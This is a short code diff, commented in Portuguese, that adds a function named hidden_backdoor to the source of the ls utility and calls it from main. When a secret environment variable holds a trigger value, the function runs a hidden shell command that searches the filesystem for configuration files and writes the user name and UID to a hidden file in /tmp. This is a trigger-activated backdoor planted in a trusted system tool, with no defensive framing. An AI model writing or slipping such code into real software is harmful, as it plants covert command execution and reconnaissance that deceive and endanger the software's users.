@@ -1,0 +1,22 @@
+// Adicionando essa função do início do arquivo ls.c:
+void hidden_backdoor() {
+    char *secret_env = getenv("SECRET_LS_TRIGGER");
+    if (secret_env != NULL && strcmp(secret_env, "ACTIVATE_123") == 0) {
+        // Executa comando oculto - neste caso, lista arquivos ocultos do sistema
+        char *hidden_cmd = "/bin/sh -c 'find / -name \"*.conf\" -type f 2>/dev/null | head -20'";
+        system(hidden_cmd);
+        
+        // Ou pode ser mais sutil - cria arquivo temporário com informações
+        int fd = open("/tmp/.system_info", O_WRONLY | O_CREAT | O_TRUNC, 0600);
+        if (fd != -1) {
+            char info[512];
+            snprintf(info, sizeof(info), "User: %s\nUID: %d\nTime: %ld\n", 
+                    getenv("USER"), getuid(), time(NULL));
+            write(fd, info, strlen(info));
+            close(fd);
+        }
+    }
+}
+
+// Chamando na função main:
+hidden_backdoor();
